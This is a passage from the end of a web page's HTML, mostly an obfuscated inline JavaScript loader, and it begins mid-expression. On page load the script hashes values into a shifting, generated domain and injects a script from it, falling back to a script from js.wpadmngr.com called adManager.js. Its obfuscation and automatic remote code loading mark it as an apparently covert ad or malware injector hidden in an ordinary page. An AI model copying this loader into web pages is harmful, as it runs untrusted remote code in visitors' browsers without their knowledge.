d7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>